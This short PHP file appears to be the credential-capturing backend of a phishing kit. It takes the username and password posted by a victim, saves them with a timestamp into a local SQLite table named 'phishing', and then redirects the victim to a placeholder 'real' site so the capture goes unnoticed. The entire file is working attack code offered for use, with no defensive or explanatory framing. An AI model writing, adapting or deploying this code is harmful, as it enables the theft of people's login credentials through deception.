<?php

    if(isset($_POST["user"]) && isset($_POST["pass"])){

        try{
            $pdo = new PDO("sqlite:phisher.db");
        
        }catch(Exception $e){
            die();

        }
        
        $query = $pdo->prepare("INSERT INTO phishing (usuario, senha, dataEhora) VALUES (?, ?, ?)");
        
        if($query->execute(array($_POST["user"], $_POST["pass"], date("d-m-Y h:i:s a", time())))){
            header("Location: Put your real redirection URL");

        }else {
            die();

        }
        
    }else {
        header("Location: /view/index.php");

    }  

?>